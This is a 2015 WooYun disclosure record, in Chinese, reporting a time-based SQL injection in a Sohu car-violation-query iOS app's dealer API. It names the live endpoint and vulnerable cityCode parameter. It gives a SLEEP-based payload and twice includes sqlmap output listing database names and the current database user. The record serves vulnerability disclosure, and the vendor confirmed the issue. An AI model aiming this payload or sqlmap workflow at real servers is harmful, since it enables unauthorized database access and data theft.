{"id": 73823, "wybug_id": "wooyun-2015-0164091", "wybug_title": "搜狐违章查询IOS客户端某接口SQL注入", "wybug_corp": "搜狐", "wybug_author": "Aasron", "wybug_date": "2015-12-24 09:35", "wybug_open_date": "2016-02-06 10:45", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-06：\t细节向公众公开  简要描述： 我不能再默默无闻下去了...PS:这都不来分和奖励，我半夜三更岂不是白忙活了~ 详细说明：  \n\n地址就不用给了，AppStore上面搜索就可以下载了问题出在周边服务查询接口，如下图\n\n在网页上访问\n\n接口地址:http://open.dealer.auto.sohu.com/api/dealerForDbModelPage?modelId=4835&cityCode=510100&_=1450903117507&callback=Data.parse4S\n注入参数#cityCode\n\nPayload:cityCode=510100;(SELECT * FROM (SELECT(SLEEP(5)))bspd)\n\n[04:49:00] [INFO] testing MySQLdo you want sqlmap to try to optimize value(s) for DBMS delay responses (option'--time-sec')? [Y/n][04:49:09] [INFO] confirming MySQL[04:49:09] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors[04:49:19] [INFO] adjusting time delay to 1 second due to good response times[04:49:19] [INFO] the back-end DBMS is MySQLweb application technology: Nginxback-end DBMS: MySQL >= 5.0.0[04:49:19] [INFO] fetching database names[04:49:19] [INFO] fetching number of databases[04:49:19] [INFO] retrieved: 4[04:49:21] [INFO] retrieved: information_schema[04:53:33] [INFO] retrieved: autodealer[04:58:06] [INFO] retrieved: dealer[05:00:19] [INFO] retrieved: tesyavailable databases [4]:[*] autodealer[*] dealer[*] information_schema[*] tesy\n\n[05:05:51] [INFO] testing MySQL[05:05:51] [INFO] confirming MySQL[05:05:51] [INFO] the back-end DBMS is MySQLweb application technology: Nginxback-end DBMS: MySQL >= 5.0.0[05:05:51] [INFO] fetching current user[05:05:51] [WARNING] time-based comparison requires larger statistical model, please wait..............................do you want sqlmap to try to optimize value(s) for DBMS delay responses (option'--time-sec')? [Y/n][05:05:59] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errorsa[05:06:11] [INFO] adjusting time delay to 1 second due to good response timesutodeal[05:08:48] [ERROR] invalid character detected. retrying..[05:08:48] [WARNING] increasing time delay to 2 seconds[05:08:57] [ERROR] invalid character detected. retrying..[05:08:57] [WARNING] increasing time delay to 3 secondser@%current user:    'autodealer@%'\n   漏洞证明：  \n\n地址就不用给了，AppStore上面搜索就可以下载了问题出在周边服务查询接口，如下图\n\n在网页上访问\n\n接口地址:http://open.dealer.auto.sohu.com/api/dealerForDbModelPage?modelId=4835&cityCode=510100&_=1450903117507&callback=Data.parse4S\n注入参数#cityCode\n\n[04:49:00] [INFO] testing MySQLdo you want sqlmap to try to optimize value(s) for DBMS delay responses (option'--time-sec')? [Y/n][04:49:09] [INFO] confirming MySQL[04:49:09] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors[04:49:19] [INFO] adjusting time delay to 1 second due to good response times[04:49:19] [INFO] the back-end DBMS is MySQLweb application technology: Nginxback-end DBMS: MySQL >= 5.0.0[04:49:19] [INFO] fetching database names[04:49:19] [INFO] fetching number of databases[04:49:19] [INFO] retrieved: 4[04:49:21] [INFO] retrieved: information_schema[04:53:33] [INFO] retrieved: autodealer[04:58:06] [INFO] retrieved: dealer[05:00:19] [INFO] retrieved: tesyavailable databases [4]:[*] autodealer[*] dealer[*] information_schema[*] tesy\n\n[05:05:51] [INFO] testing MySQL[05:05:51] [INFO] confirming MySQL[05:05:51] [INFO] the back-end DBMS is MySQLweb application technology: Nginxback-end DBMS: MySQL >= 5.0.0[05:05:51] [INFO] fetching current user[05:05:51] [WARNING] time-based comparison requires larger statistical model, please wait..............................do you want sqlmap to try to optimize value(s) for DBMS delay responses (option'--time-sec')? [Y/n][05:05:59] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errorsa[05:06:11] [INFO] adjusting time delay to 1 second due to good response timesutodeal[05:08:48] [ERROR] invalid character detected. retrying..[05:08:48] [WARNING] increasing time delay to 2 seconds[05:08:57] [ERROR] invalid character detected. retrying..[05:08:57] [WARNING] increasing time delay to 3 secondser@%current user:    'autodealer@%'\n   修复方案：  过滤   版权声明：转载请注明来源 Aasron@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-12-24 10:05 厂商回复： 感谢你对搜狐安全的支持。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}